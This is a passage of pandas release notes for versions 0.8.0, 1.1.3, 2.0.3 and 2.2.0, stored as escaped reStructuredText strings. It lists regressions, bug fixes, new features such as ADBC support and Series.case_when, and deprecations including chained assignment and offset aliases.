  **Trust me: don't panic**. If you are using NumPy 1.6 and restrict your\n    interaction with ``datetime64`` values to pandas's API you will be just\n    fine. There is nothing wrong with the data-type (a 64-bit integer\n    internally); all of the important data processing happens in pandas and is\n    heavily tested. I strongly recommend that you **do not work directly with\n    datetime64 arrays in NumPy 1.6** and only use the pandas API.\n\n\n**Support for non-unique indexes**: In the latter case, you may have code\ninside a ``try:... catch:`` block that failed due to the index not being\nunique. In many cases it will no longer fail (some method like ``append`` still\ncheck for uniqueness unless disabled). However, all is not lost: you can\ninspect ``index.is_unique`` and raise an exception explicitly if it is\n``False`` or go to a different code branch.\n\n\n.. _whatsnew_0.8.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.7.3..v0.8.0\n", "1.1.3": ".. _whatsnew_113:\n\nWhat's new in 1.1.3 (October 5, 2020)\n-------------------------------------\n\nThese are the changes in pandas 1.1.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\nAdded support for new Python version\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 1.1.3 now supports Python 3.9 (:issue:`36296`).\n\nDevelopment Changes\n^^^^^^^^^^^^^^^^^^^\n\n- The minimum version of Cython is now the most recent bug-fix version (0.29.21) (:issue:`36296`).\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_113.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.agg`, :meth:`DataFrame.apply`, :meth:`Series.agg`, and :meth:`Series.apply` where internal suffix is exposed to the users when no relabelling is applied (:issue:`36189`)\n- Fixed regression in :class:`IntegerArray` unary plus and minus operations raising a ``TypeError`` (:issue:`36063`)\n- Fixed regression when adding a :meth:`timedelta_range` to a :class:`Timestamp` raised a ``ValueError`` (:issue:`35897`)\n- Fixed regression in :meth:`Series.__getitem__` incorrectly raising when the input was a tuple (:issue:`35534`)\n- Fixed regression in :meth:`Series.__getitem__` incorrectly raising when the input was a frozenset (:issue:`35747`)\n- Fixed regression in modulo of :class:`Index`, :class:`Series` and :class:`DataFrame` using ``numexpr`` using C not Python semantics (:issue:`36047`, :issue:`36526`)\n- Fixed regression in :meth:`read_excel` with ``engine=\"odf\"`` caused ``UnboundLocalError`` in some cases where cells had nested child nodes (:issue:`36122`, :issue:`35802`)\n- Fixed regression in :meth:`DataFrame.replace` inconsistent replace when using a float in the replace method (:issue:`35376`)\n- Fixed regression in :meth:`Series.loc` on a :class:`Series` with a :class:`MultiIndex` containing :class:`Timestamp` raising ``InvalidIndexError`` (:issue:`35858`)\n- Fixed regression in :class:`DataFrame` and :class:`Series` comparisons between numeric arrays and strings (:issue:`35700`, :issue:`36377`)\n- Fixed regression in :meth:`DataFrame.apply` with ``raw=True`` and user-function returning string (:issue:`35940`)\n- Fixed regression when setting empty :class:`DataFrame` column to a :class:`Series` in preserving name of index in frame (:issue:`36527`)\n- Fixed regression in :class:`Period` incorrect value for ordinal over the maximum timestamp (:issue:`36430`)\n- Fixed regression in :func:`read_table` raised ``ValueError`` when ``delim_whitespace`` was set to ``True`` (:issue:`35958`)\n- Fixed regression in :meth:`Series.dt.normalize` when normalizing pre-epoch dates the result was shifted one day (:issue:`36294`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_113.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :func:`read_spss` where passing a ``pathlib.Path`` as ``path`` would raise a ``TypeError`` (:issue:`33666`)\n- Bug in :meth:`Series.str.startswith` and :meth:`Series.str.endswith` with ``category`` dtype not propagating ``na`` parameter (:issue:`36241`)\n- Bug in :class:`Series` constructor where integer overflow would occur for sufficiently large scalar inputs when an index was provided (:issue:`36291`)\n- Bug in :meth:`DataFrame.sort_values` raising an ``AttributeError`` when sorting on a key that casts column to categorical dtype (:issue:`36383`)\n- Bug in :meth:`DataFrame.stack` raising a ``ValueError`` when stacking :class:`MultiIndex` columns based on position when the levels had duplicate names (:issue:`36353`)\n- Bug in :meth:`Series.astype` showing too much precision when casting from ``np.float32`` to string dtype (:issue:`36451`)\n- Bug in :meth:`Series.isin` and :meth:`DataFrame.isin` when using ``NaN`` and a row length above 1,000,000 (:issue:`22205`)\n- Bug in :func:`cut` raising a ``ValueError`` when passed a :class:`Series` of labels with ``ordered=False`` (:issue:`36603`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_113.other:\n\nOther\n~~~~~\n- Reverted enhancement added in pandas-1.1.0 where :func:`timedelta_range` infers a frequency when passed ``start``, ``stop``, and ``periods`` (:issue:`32377`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_113.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.2..v1.1.3\n", "2.0.3": ".. _whatsnew_203:\n\nWhat's new in 2.0.3 (June 28, 2023)\n-----------------------------------\n\nThese are the changes in pandas 2.0.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_203.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Bug in :meth:`Timestamp.weekday`` was returning incorrect results before ``'0000-02-29'`` (:issue:`53738`)\n- Fixed performance regression in merging on datetime-like columns (:issue:`53231`)\n- Fixed regression when :meth:`DataFrame.to_string` creates extra space for string dtypes (:issue:`52690`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_203.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :func:`DataFrame.convert_dtype` and :func:`Series.convert_dtype` when trying to convert :class:`ArrowDtype` with ``dtype_backend=\"nullable_numpy\"`` (:issue:`53648`)\n- Bug in :func:`RangeIndex.union` when using ``sort=True`` with another :class:`RangeIndex` (:issue:`53490`)\n- Bug in :func:`Series.reindex` when expanding a non-nanosecond datetime or timedelta :class:`Series` would not fill with ``NaT`` correctly (:issue:`53497`)\n- Bug in :func:`read_csv` when defining ``dtype`` with ``bool[pyarrow]`` for the ``\"c\"`` and ``\"python\"`` engines (:issue:`53390`)\n- Bug in :meth:`Series.str.split` and :meth:`Series.str.rsplit` with ``expand=True`` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`53532`)\n- Bug in indexing methods (e.g. :meth:`DataFrame.__getitem__`) where taking the entire :class:`DataFrame`/:class:`Series` would raise an ``OverflowError`` when Copy on Write was enabled and the length of the array was over the maximum size a 32-bit integer can hold (:issue:`53616`)\n- Bug when constructing a :class:`DataFrame` with columns of an :class:`ArrowDtype` with a ``pyarrow.dictionary`` type that reindexes the data (:issue:`53617`)\n- Bug when indexing a :class:`DataFrame` or :class:`Series` with an :class:`Index` with a timestamp :class:`ArrowDtype` would raise an ``AttributeError`` (:issue:`53644`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_203.other:\n\nOther\n~~~~~\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_203.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.0.2..v2.0.3\n", "2.2.0": ".. _whatsnew_220:\n\nWhat's new in 2.2.0 (January 19, 2024)\n--------------------------------------\n\nThese are the changes in pandas 2.2.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_220.upcoming_changes:\n\nUpcoming changes in pandas 3.0\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\npandas 3.0 will bring two bigger changes to the default behavior of pandas.\n\nCopy-on-Write\n^^^^^^^^^^^^^\n\nThe currently optional mode Copy-on-Write will be enabled by default in pandas 3.0. There\nwon't be an option to keep the current behavior enabled. The new behavioral semantics are\nexplained in the :ref:`user guide about Copy-on-Write <copy_on_write>`.\n\nThe new behavior can be enabled since pandas 2.0 with the following option:\n\n.. code-block:: ipython\n\n   pd.options.mode.copy_on_write = True\n\nThis change brings different changes in behavior in how pandas operates with respect to\ncopies and views. Some of these changes allow a clear deprecation, like the changes in\nchained assignment. Other changes are more subtle and thus, the warnings are hidden behind\nan option that can be enabled in pandas 2.2.\n\n.. code-block:: ipython\n\n   pd.options.mode.copy_on_write = \"warn\"\n\nThis mode will warn in many different scenarios that aren't actually relevant to\nmost queries. We recommend exploring this mode, but it is not necessary to get rid\nof all of these warnings. The :ref:`migration guide <copy_on_write.migration_guide>`\nexplains the upgrade process in more detail.\n\nDedicated string data type (backed by Arrow) by default\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nHistorically, pandas represented string columns with NumPy object data type. This\nrepresentation has numerous problems, including slow performance and a large memory\nfootprint. This will change in pandas 3.0. pandas will start inferring string columns\nas a new ``string`` data type, backed by Arrow, which represents strings contiguous in memory. This brings\na huge performance and memory improvement.\n\nOld behavior:\n\n.. code-block:: ipython\n\n    In [1]: ser = pd.Series([\"a\", \"b\"])\n    Out[1]:\n    0    a\n    1    b\n    dtype: object\n\nNew behavior:\n\n\n.. code-block:: ipython\n\n    In [1]: ser = pd.Series([\"a\", \"b\"])\n    Out[1]:\n    0    a\n    1    b\n    dtype: string\n\nThe string data type that is used in these scenarios will mostly behave as NumPy\nobject would, including missing value semantics and general operations on these\ncolumns.\n\nThis change includes a few additional changes across the API:\n\n- Currently, specifying ``dtype=\"string\"`` creates a dtype that is backed by Python strings\n  which are stored in a NumPy array. This will change in pandas 3.0, this dtype\n  will create an Arrow backed string column.\n- The column names and the Index will also be backed by Arrow strings.\n- PyArrow will become a required dependency with pandas 3.0 to accommodate this change.\n\nThis future dtype inference logic can be enabled with:\n\n.. code-block:: ipython\n\n   pd.options.future.infer_string = True\n\n.. _whatsnew_220.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_220.enhancements.adbc_support:\n\nADBC Driver support in to_sql and read_sql\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`read_sql` and :meth:`~DataFrame.to_sql` now work with `Apache Arrow ADBC\n<https://arrow.apache.org/adbc/current/index.html>`_ drivers. Compared to\ntraditional drivers used via SQLAlchemy, ADBC drivers should provide\nsignificant performance improvements, better type support and cleaner\nnullability handling.\n\n.. code-block:: ipython\n\n   import adbc_driver_postgresql.dbapi as pg_dbapi\n\n   df = pd.DataFrame(\n       [\n           [1, 2, 3],\n           [4, 5, 6],\n       ],\n       columns=['a', 'b', 'c']\n   )\n   uri = \"postgresql://postgres:postgres@localhost/postgres\"\n   with pg_dbapi.connect(uri) as conn:\n       df.to_sql(\"pandas_table\", conn, index=False)\n\n   # for round-tripping\n   with pg_dbapi.connect(uri) as conn:\n       df2 = pd.read_sql(\"pandas_table\", conn)\n\nThe Arrow type system offers a wider array of types that can more closely match\nwhat databases like PostgreSQL can offer. To illustrate, note this (non-exhaustive)\nlisting of types available in different databases and pandas backends:\n\n+-----------------+-----------------------+----------------+---------+\n|numpy/pandas     |arrow                  |postgres        |sqlite   |\n+=================+=======================+================+=========+\n|int16/Int16      |int16                  |SMALLINT        |INTEGER  |\n+-----------------+-----------------------+----------------+---------+\n|int32/Int32      |int32                  |INTEGER         |INTEGER  |\n+-----------------+-----------------------+----------------+---------+\n|int64/Int64      |int64                  |BIGINT          |INTEGER  |\n+-----------------+-----------------------+----------------+---------+\n|float32          |float32                |REAL            |REAL     |\n+-----------------+-----------------------+----------------+---------+\n|float64          |float64                |DOUBLE PRECISION|REAL     |\n+-----------------+-----------------------+----------------+---------+\n|object           |string                 |TEXT            |TEXT     |\n+-----------------+-----------------------+----------------+---------+\n|bool             |``bool_``              |BOOLEAN         |         |\n+-----------------+-----------------------+----------------+---------+\n|datetime64[ns]   |timestamp(us)          |TIMESTAMP       |         |\n+-----------------+-----------------------+----------------+---------+\n|datetime64[ns,tz]|timestamp(us,tz)       |TIMESTAMPTZ     |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |date32                 |DATE            |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |month_day_nano_interval|INTERVAL        |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |binary                 |BINARY          |BLOB     |\n+-----------------+-----------------------+----------------+---------+\n|                 |decimal128             |DECIMAL [#f1]_  |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |list                   |ARRAY [#f1]_    |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |struct                 |COMPOSITE TYPE  |         |\n|                 |                       | [#f1]_         |         |\n+-----------------+-----------------------+----------------+---------+\n\n.. rubric:: Footnotes\n\n.. [#f1] Not implemented as of writing, but theoretically possible\n\nIf you are interested in preserving database types as best as possible\nthroughout the lifecycle of your DataFrame, users are encouraged to\nleverage the ``dtype_backend=\"pyarrow\"`` argument of :func:`~pandas.read_sql`\n\n.. code-block:: ipython\n\n   # for round-tripping\n   with pg_dbapi.connect(uri) as conn:\n       df2 = pd.read_sql(\"pandas_table\", conn, dtype_backend=\"pyarrow\")\n\nThis will prevent your data from being converted to the traditional pandas/NumPy\ntype system, which often converts SQL types in ways that make them impossible to\nround-trip.\n\nFor a full list of ADBC drivers and their development status, see the `ADBC Driver\nImplementation Status <https://arrow.apache.org/adbc/current/driver/status.html>`_\ndocumentation.\n\n.. _whatsnew_220.enhancements.case_when:\n\nCreate a pandas Series based on one or more conditions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :meth:`Series.case_when` function has been added to create a Series object based on one or more conditions. (:issue:`39154`)\n\n.. ipython:: python\n\n   import pandas as pd\n\n   df = pd.DataFrame(dict(a=[1, 2, 3], b=[4, 5, 6]))\n   default=pd.Series('default', index=df.index)\n   default.case_when(\n        caselist=[\n            (df.a == 1, 'first'),                              # condition, replacement\n            (df.a.gt(1) & df.b.eq(5), 'second'),  # condition, replacement\n        ],\n   )\n\n.. _whatsnew_220.enhancements.to_numpy_ea:\n\n``to_numpy`` for NumPy nullable and Arrow types converts to suitable NumPy dtype\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``to_numpy`` for NumPy nullable and Arrow types will now convert to a\nsuitable NumPy dtype instead of ``object`` dtype for nullable and PyArrow backed extension dtypes.\n\n*Old behavior:*\n\n.. code-block:: ipython\n\n    In [1]: ser = pd.Series([1, 2, 3], dtype=\"Int64\")\n    In [2]: ser.to_numpy()\n    Out[2]: array([1, 2, 3], dtype=object)\n\n*New behavior:*\n\n.. ipython:: python\n\n    ser = pd.Series([1, 2, 3], dtype=\"Int64\")\n    ser.to_numpy()\n\n    ser = pd.Series([1, 2, 3], dtype=\"timestamp[ns][pyarrow]\")\n    ser.to_numpy()\n\nThe default NumPy dtype (without any arguments) is determined as follows:\n\n- float dtypes are cast to NumPy floats\n- integer dtypes without missing values are cast to NumPy integer dtypes\n- integer dtypes with missing values are cast to NumPy float dtypes and ``NaN`` is used as missing value indicator\n- boolean dtypes without missing values are cast to NumPy bool dtype\n- boolean dtypes with missing values keep object dtype\n- datetime and timedelta types are cast to Numpy datetime64 and timedelta64 types respectively and ``NaT`` is used as missing value indicator\n\n.. _whatsnew_220.enhancements.struct_accessor:\n\nSeries.struct accessor for PyArrow structured data\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``Series.struct`` accessor provides attributes and methods for processing\ndata with ``struct[pyarrow]`` dtype Series. For example,\n:meth:`Series.struct.explode` converts PyArrow structured data to a pandas\nDataFrame. (:issue:`54938`)\n\n.. ipython:: python\n\n    import pyarrow as pa\n    series = pd.Series(\n        [\n            {\"project\": \"pandas\", \"version\": \"2.2.0\"},\n            {\"project\": \"numpy\", \"version\": \"1.25.2\"},\n            {\"project\": \"pyarrow\", \"version\": \"13.0.0\"},\n        ],\n        dtype=pd.ArrowDtype(\n            pa.struct([\n                (\"project\", pa.string()),\n                (\"version\", pa.string()),\n            ])\n        ),\n    )\n    series.struct.explode()\n\nUse :meth:`Series.struct.field` to index into a (possible nested)\nstruct field.\n\n\n.. ipython:: python\n\n    series.struct.field(\"project\")\n\n.. _whatsnew_220.enhancements.list_accessor:\n\nSeries.list accessor for PyArrow list data\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``Series.list`` accessor provides attributes and methods for processing\ndata with ``list[pyarrow]`` dtype Series. For example,\n:meth:`Series.list.__getitem__` allows indexing pyarrow lists in\na Series. (:issue:`55323`)\n\n.. ipython:: python\n\n    import pyarrow as pa\n    series = pd.Series(\n        [\n            [1, 2, 3],\n            [4, 5],\n            [6],\n        ],\n        dtype=pd.ArrowDtype(\n            pa.list_(pa.int64())\n        ),\n    )\n    series.list[0]\n\n.. _whatsnew_220.enhancements.calamine:\n\nCalamine engine for :func:`read_excel`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``calamine`` engine was added to :func:`read_excel`.\nIt uses ``python-calamine``, which provides Python bindings for the Rust library `calamine <https://crates.io/crates/calamine>`__.\nThis engine supports Excel files (``.xlsx``, ``.xlsm``, ``.xls``, ``.xlsb``) and OpenDocument spreadsheets (``.ods``) (:issue:`50395`).\n\nThere are two advantages of this engine:\n\n1. Calamine is often faster than other engines, some benchmarks show results up to 5x faster than 'openpyxl', 20x - 'odf', 4x - 'pyxlsb', and 1.5x - 'xlrd'.\n   But, 'openpyxl' and 'pyxlsb' are faster in reading a few rows from large files because of lazy iteration over rows.\n2. Calamine supports the recognition of datetime in ``.xlsb`` files, unlike 'pyxlsb' which is the only other engine in pandas that can read ``.xlsb`` files.\n\n.. code-block:: python\n\n   pd.read_excel(\"path_to_file.xlsb\", engine=\"calamine\")\n\n\nFor more, see :ref:`io.calamine` in the user guide on IO tools.\n\n.. _whatsnew_220.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- :meth:`~DataFrame.to_sql` with method parameter set to ``multi`` works with Oracle on the backend\n- :attr:`Series.attrs` / :attr:`DataFrame.attrs` now uses a deepcopy for propagating ``attrs`` (:issue:`54134`).\n- :func:`get_dummies` now returning  extension dtypes ``boolean`` or ``bool[pyarrow]`` that are compatible with the input dtype (:issue:`56273`)\n- :func:`read_csv` now supports ``on_bad_lines`` parameter with ``engine=\"pyarrow\"`` (:issue:`54480`)\n- :func:`read_sas` returns ``datetime64`` dtypes with resolutions better matching those stored natively in SAS, and avoids returning object-dtype in cases that cannot be stored with ``datetime64[ns]`` dtype (:issue:`56127`)\n- :func:`read_spss` now returns a :class:`DataFrame` that stores the metadata in :attr:`DataFrame.attrs` (:issue:`54264`)\n- :func:`tseries.api.guess_datetime_format` is now part of the public API (:issue:`54727`)\n- :meth:`DataFrame.apply` now allows the usage of numba (via ``engine=\"numba\"``) to JIT compile the passed function, allowing for potential speedups (:issue:`54666`)\n- :meth:`ExtensionArray._explode` interface method added to allow extension type implementations of the ``explode`` method (:issue:`54833`)\n- :meth:`ExtensionArray.duplicated` added to allow extension type implementations of the ``duplicated`` method (:issue:`55255`)\n- :meth:`Series.ffill`, :meth:`Series.bfill`, :meth:`DataFrame.ffill`, and :meth:`DataFrame.bfill` have gained the argument ``limit_area``; 3rd party :class:`.ExtensionArray` authors need to add this argument to the method ``_pad_or_backfill`` (:issue:`56492`)\n- Allow passing ``read_only``, ``data_only`` and ``keep_links`` arguments to openpyxl using ``engine_kwargs`` of :func:`read_excel` (:issue:`55027`)\n- Implement :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` for :class:`ArrowDtype` and masked dtypes (:issue:`56267`)\n- Implement masked algorithms for :meth:`Series.value_counts` (:issue:`54984`)\n- Implemented :meth:`Series.dt` methods and attributes for :class:`ArrowDtype` with ``pyarrow.duration`` type (:issue:`52284`)\n- Implemented :meth:`Series.str.extract` for :class:`ArrowDtype` (:issue:`56268`)\n- Improved error message that appears in :meth:`DatetimeIndex.to_period` with frequencies which are not supported as period frequencies, such as ``\"BMS\"`` (:issue:`56243`)\n- Improved error message when constructing :class:`Period` with invalid offsets such as ``\"QS\"`` (:issue:`55785`)\n- The dtypes ``string[pyarrow]`` and ``string[pyarrow_numpy]`` now both utilize the ``large_string`` type from PyArrow to avoid overflow for long columns (:issue:`56259`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_220.notable_bug_fixes.merge_sort_behavior:\n\n:func:`merge` and :meth:`DataFrame.join` now consistently follow documented sort behavior\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, :func:`merge` and :meth:`DataFrame.join` did not\nalways return a result that followed the documented sort behavior. pandas now\nfollows the documented sort behavior in merge and join operations (:issue:`54611`, :issue:`56426`, :issue:`56443`).\n\nAs documented, ``sort=True`` sorts the join keys lexicographically in the resulting\n:class:`DataFrame`. With ``sort=False``, the order of the join keys depends on the\njoin type (``how`` keyword):\n\n- ``how=\"left\"``: preserve the order of the left keys\n- ``how=\"right\"``: preserve the order of the right keys\n- ``how=\"inner\"``: preserve the order of the left keys\n- ``how=\"outer\"``: sort keys lexicographically\n\nOne example with changing behavior is inner joins with non-unique left join keys\nand ``sort=False``:\n\n.. ipython:: python\n\n    left = pd.DataFrame({\"a\": [1, 2, 1]})\n    right = pd.DataFrame({\"a\": [1, 2]})\n    result = pd.merge(left, right, how=\"inner\", on=\"a\", sort=False)\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [5]: result\n    Out[5]:\n       a\n    0  1\n    1  1\n    2  2\n\n*New Behavior*\n\n.. ipython:: python\n\n    result\n\n.. _whatsnew_220.notable_bug_fixes.multiindex_join_different_levels:\n\n:func:`merge` and :meth:`DataFrame.join` no longer reorder levels when levels differ\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, :func:`merge` and :meth:`DataFrame.join` would reorder\nindex levels when joining on two indexes with different levels (:issue:`34133`).\n\n.. ipython:: python\n\n    left = pd.DataFrame({\"left\": 1}, index=pd.MultiIndex.from_tuples([(\"x\", 1), (\"x\", 2)], names=[\"A\", \"B\"]))\n    right = pd.DataFrame({\"right\": 2}, index=pd.MultiIndex.from_tuples([(1, 1), (2, 2)], names=[\"B\", \"C\"]))\n    left\n    right\n    result = left.join(right)\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [5]: result\n    Out[5]:\n           left  right\n    B A C\n    1 x 1     1      2\n    2 x 2     1      2\n\n*New Behavior*\n\n.. ipython:: python\n\n    result\n\n.. _whatsnew_220.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nFor `optional dependencies <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nOptional dependencies below the lowest tested version may still work but are not considered supported.\nThe following table lists the optional dependencies that have had their minimum tested version increased.\n\n+-----------------+---------------------+\n| Package         | New Minimum Version |\n+=================+=====================+\n| beautifulsoup4  | 4.11.2              |\n+-----------------+---------------------+\n| blosc           | 1.21.3              |\n+-----------------+---------------------+\n| bottleneck      | 1.3.6               |\n+-----------------+---------------------+\n| fastparquet     | 2022.12.0           |\n+-----------------+---------------------+\n| fsspec          | 2022.11.0           |\n+-----------------+---------------------+\n| gcsfs           | 2022.11.0           |\n+-----------------+---------------------+\n| lxml            | 4.9.2               |\n+-----------------+---------------------+\n| matplotlib      | 3.6.3               |\n+-----------------+---------------------+\n| numba           | 0.56.4              |\n+-----------------+---------------------+\n| numexpr         | 2.8.4               |\n+-----------------+---------------------+\n| qtpy            | 2.3.0               |\n+-----------------+---------------------+\n| openpyxl        | 3.1.0               |\n+-----------------+---------------------+\n| psycopg2        | 2.9.6               |\n+-----------------+---------------------+\n| pyreadstat      | 1.2.0               |\n+-----------------+---------------------+\n| pytables        | 3.8.0               |\n+-----------------+---------------------+\n| pyxlsb          | 1.0.10              |\n+-----------------+---------------------+\n| s3fs            | 2022.11.0           |\n+-----------------+---------------------+\n| scipy           | 1.10.0              |\n+-----------------+---------------------+\n| sqlalchemy      | 2.0.0               |\n+-----------------+---------------------+\n| tabulate        | 0.9.0               |\n+-----------------+---------------------+\n| xarray          | 2022.12.0           |\n+-----------------+---------------------+\n| xlsxwriter      | 3.0.5               |\n+-----------------+---------------------+\n| zstandard       | 0.19.0              |\n+-----------------+---------------------+\n| pyqt5           | 5.15.8              |\n+-----------------+---------------------+\n| tzdata          | 2022.7              |\n+-----------------+---------------------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_220.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- The hash values of nullable extension dtypes changed to improve the performance of the hashing operation (:issue:`56507`)\n- ``check_exact`` now only takes effect for floating-point dtypes in :func:`testing.assert_frame_equal` and :func:`testing.assert_series_equal`. In particular, integer dtypes are always checked exactly (:issue:`55882`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\nChained assignment\n^^^^^^^^^^^^^^^^^^\n\nIn preparation of larger upcoming changes to the copy / view behaviour in pandas 3.0\n(:ref:`copy_on_write`, PDEP-7), we started deprecating *chained assignment*.\n\nChained assignment occurs when you try to update a pandas DataFrame or Series through\ntwo subsequent indexing operations. Depending on the type and order of those operations\nthis currently does or does not work.\n\nA typical example is as follows:\n\n.. code-block:: python\n\n    df = pd.DataFrame({\"foo\": [1, 2, 3], \"bar\": [4, 5, 6]})\n\n    # first selecting rows with a mask, then assigning values to a column\n    # -> this has never worked and raises a SettingWithCopyWarning\n    df[df[\"bar\"] > 5][\"foo\"] = 100\n\n    # first selecting the column, and then assigning to a subset of that column\n    # -> this currently works\n    df[\"foo\"][df[\"bar\"] > 5] = 100\n\nThis second example of chained assignment currently works to update the original ``df``.\nThis will no longer work in pandas 3.0, and therefore we started deprecating this:\n\n.. code-block:: python\n\n    >>> df[\"foo\"][df[\"bar\"] > 5] = 100\n    FutureWarning: ChainedAssignmentError: behaviour will change in pandas 3.0!\n    You are setting values through chained assignment. Currently this works in certain cases, but when using Copy-on-Write (which will become the default behaviour in pandas 3.0) this will never work to update the original DataFrame or Series, because the intermediate object on which we are setting values will behave as a copy.\n    A typical example is when you are setting values in a column of a DataFrame, like:\n\n    df[\"col\"][row_indexer] = value\n\n    Use `df.loc[row_indexer, \"col\"] = values` instead, to perform the assignment in a single step and ensure this keeps updating the original `df`.\n\n    See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n\nYou can fix this warning and ensure your code is ready for pandas 3.0 by removing\nthe usage of chained assignment. Typically, this can be done by doing the assignment\nin a single step using for example ``.loc``. For the example above, we can do:\n\n.. code-block:: python\n\n    df.loc[df[\"bar\"] > 5, \"foo\"] = 100\n\nThe same deprecation applies to inplace methods that are done in a chained manner, such as:\n\n.. code-block:: python\n\n    >>> df[\"foo\"].fillna(0, inplace=True)\n    FutureWarning: A value is trying to be set on a copy of a DataFrame or Series through chained assignment using an inplace method.\n    The behavior will change in pandas 3.0. This inplace method will never work because the intermediate object on which we are setting values always behaves as a copy.\n\n    For example, when doing 'df[col].method(value, inplace=True)', try using 'df.method({col: value}, inplace=True)' or df[col] = df[col].method(value) instead, to perform the operation inplace on the original object.\n\nWhen the goal is to update the column in the DataFrame ``df``, the alternative here is\nto call the method on ``df`` itself, such as ``df.fillna({\"foo\": 0}, inplace=True)``.\n\nSee more details in the :ref:`migration guide <copy_on_write.migration_guide>`.\n\n\nDeprecate aliases ``M``, ``Q``, ``Y``, etc. in favour of ``ME``, ``QE``, ``YE``, etc. for offsets\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nDeprecated the following frequency aliases (:issue:`9586`):\n\n+-------------------------------+------------------+------------------+\n|offsets                        |deprecated aliases|new aliases       |\n+===============================+==================+==================+\n|:class:`MonthEnd`              |      ``M``       |     ``ME``       |\n+-------------------------------+------------------+------------------+\n|:class:`BusinessMonthEnd`      |      ``BM``      |     ``BME``      |\n+-------------------------------+------------------+------------------+\n|:class:`SemiMonthEnd`          |      ``SM``      |     ``SME``      |\n+-------------------------------+------------------+------------------+\n|:class:`CustomBusinessMonthEnd`|      ``CBM``     |     ``CBME``     |\n+-------------------------------+------------------+------------------+\n|:class:`QuarterEnd`            |      ``Q``       |     ``QE``       |\n+-------------------------------+------------------+------------------+\n|:class:`BQuarterEnd`           |      ``BQ``      |     ``BQE``      |\n+-------------------------------+------------------+------------------+\n|:class:`YearEnd`               |      ``Y``       |     ``YE``       |\n+-------------------------------+------------------+------------------+\n|:class:`BYearEnd`              |      ``BY``      |     ``BYE``      |\n+-------------------------------+------------------+------------------+\n\nFor example:\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [8]: pd.date_range('2020-01-01', periods=3, freq='Q-NOV')\n    Out[8]:\n    DatetimeIndex(['2020-02-29', '2020-05-31', '2020-08-31'],\n                  dtype='datetime64[ns]', freq='Q-NOV')\n\n*Future behavior*:\n\n.. ipython:: python\n\n    pd.date_range('2020-01-01', periods=3, 